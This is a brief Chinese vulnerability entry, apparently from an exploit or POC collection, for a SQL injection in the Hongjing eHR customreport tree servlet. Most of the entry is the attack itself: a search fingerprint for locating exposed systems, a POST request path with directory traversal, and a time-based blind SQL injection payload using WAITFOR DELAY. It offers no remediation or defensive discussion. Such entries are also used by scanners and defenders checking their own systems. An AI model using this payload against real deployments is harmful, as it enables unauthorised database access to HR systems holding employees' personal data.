# 宏景eHRcustomreporttreeSQL注入漏洞

宏景eHRcustomreporttree ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1`

**Payload**
```
id=1';WAITFOR DELAY '0:0:5'--+&codeset=UN&priv=1&level=
```
- **响应特征**：999